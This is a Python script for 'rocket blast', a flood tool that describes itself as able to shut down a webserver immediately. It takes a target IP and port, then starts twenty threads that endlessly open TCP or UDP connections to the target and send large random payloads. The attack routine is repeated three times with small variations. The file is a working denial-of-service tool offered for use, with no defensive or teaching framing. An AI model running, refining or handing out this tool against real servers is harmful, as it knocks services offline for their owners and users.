# rocket blast is a flood attack tool that shutdown a webserver immediately
import socket
import requests
import random
from colorama import Fore
import time
import sys
import os
from threading import Thread

if os.name == 'posix':
   os.system('clear')
else:
   os.system('cls')

if len(sys.argv) == 5:
   pass
else:
   print(Fore.YELLOW+'\n[!] Usage - python rocketblast.py -t "target_ip" -p "port"\n'+Fore.WHITE)
   exit(1)

target_ip = sys.argv[2]
port = int(sys.argv[4])
speed = 20

if sys.argv[1] == '-t':
   pass
else:
   print(Fore.YELLOW+'\n[!] Usage - python rocketblast.py -t "target_ip" -p "port"\n')
   exit(1)

if sys.argv[3] == '-p':
   pass
else:
   print(Fore.YELLOW+'\n[!] Usage - python rocketblast.py -t "target_ip" -p "port"\n')
   exit(1)


def rocketblast():
    global target_ip
    global port
    pkt = 0
    payload = random._urandom(8888)
    while True:
          pkt+=1
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((target_ip, port))
          s.sendto(b'GET / HTTP/1.0\r\n\r\n', (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          print(Fore.RED+f'\n[-RocketBlast-] Sent {pkt} Packet To {target_ip}:{port}\n'+Fore.WHITE)
          time.sleep(0.5)

for i in range(speed):
    th = Thread(target=rocketblast).start()


def rocketblast():
    global target_ip
    global port
    pkt = 0
    payload = random._urandom(8888)
    while True:
          pkt+=1
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((target_ip, port))
          s.sendto(b'GET / HTTP/1.0\r\n\r\n', (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          print(Fore.RED+f'\n[-RocketBlast-] Sent {pkt} Packet To {target_ip}:{port}\n'+Fore.WHITE)
          time.sleep(0.5)

for i in range(speed):
    th = Thread(target=rocketblast).start()


def rocketblast():
    global target_ip
    global port
    pkt = 0
    payload = random._urandom(8888)
    while True:
          pkt+=1
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          s.connect((target_ip, port))
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.send(payload)
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.sendto(payload, (target_ip, port))
          s.send(payload)
          pkt+=1
          print(Fore.RED+f'\n[-RocketBlast-] Sent {pkt} Packet To {target_ip}:{port}\n')
          time.sleep(0.5)

for i in range(speed):
    th = Thread(target=rocketblast).start()
